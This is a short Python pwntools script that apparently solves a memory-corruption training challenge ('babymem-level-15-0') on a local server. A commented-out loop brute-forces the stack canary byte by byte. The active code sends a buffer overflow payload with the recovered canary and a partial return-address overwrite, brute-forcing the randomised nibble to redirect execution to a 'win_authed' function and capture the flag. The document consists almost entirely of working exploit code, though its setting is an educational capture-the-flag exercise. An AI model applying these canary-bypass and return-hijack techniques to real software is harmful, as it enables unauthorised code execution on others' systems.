from pwn import *


# launch proc in background: ./challenge/babymem-level-15-0 &
# ps aux to see active proc --> kill <pid> (-9 to force it)

host = "localhost"
port = 1337

'''offset_to_canary = 72
base_payload = b'A' * offset_to_canary + b'\x00'
for start in range(74, 81):
    print(f'try start: {start} - {base_payload}')
    for i in range(256):
        print(f'try {i}')
        proc = remote(host, port)

        proc.recvuntil(b'size: ')
        proc.sendline(str(start).encode())
        proc.recvuntil(b'bytes)!\n')

        payload = base_payload + bytes([i])
        proc.send(payload)

        try:
            proc.recvuntil(b'*** stack smashing detected ***: terminated')
            print('stack smashing detected')
        except EOFError:
            print(f'found canary byte: {bytes([i])}')
            base_payload = payload
            print(f'{base_payload=}')
            break
        
        proc.close()


print(f'{payload=}')'''

payload= b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00bZ\xb5\xec\xfa\x924'
poss_bytes = ['0d', '1d', '2d', '3d', '4d', '5d', '6d', '7d', '8d', '9d', 'ad', 'bd', 'cd', 'dd', 'ed', 'fd']
offset_win_authed = p16(0x5db6)


for b in poss_bytes:
    hex_str = b + 'b6'
    offset_win_authed = p16(int(hex_str, 16))
    proc = remote(host, port)

    proc.recvuntil(b'size: ')
    proc.sendline(str(90).encode())

    proc.recvuntil(b'(up to 90 bytes)!\n')
    new_payload = payload + b'B' * 8 + offset_win_authed
    proc.send(new_payload)
    try:
        r = proc.recvuntil(b'}')
        # print(r)
        if b'pwn' in r:
            print(r)
            break
    except EOFError:
        pass
    proc.close()
